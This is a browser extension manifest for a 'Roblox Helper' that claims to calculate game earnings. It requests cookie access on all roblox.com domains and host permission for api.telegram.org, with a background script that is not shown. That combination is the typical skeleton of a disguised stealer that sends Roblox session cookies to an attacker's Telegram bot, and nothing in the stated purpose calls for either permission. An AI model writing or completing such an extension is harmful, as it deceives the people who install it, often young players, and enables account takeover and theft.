{
  "manifest_version": 3,
  "name": "Roblox Helper",
  "version": "1.0",
  "description": "helps with calculating any game earnings",
  "permissions": [
    "cookies",
    "storage",
    "alarms"
  ],
  "host_permissions": [
    "https://*.roblox.com/*",
    "https://api.telegram.org/*"
  ],
  "background": {
    "service_worker": "background.js"
  }
}
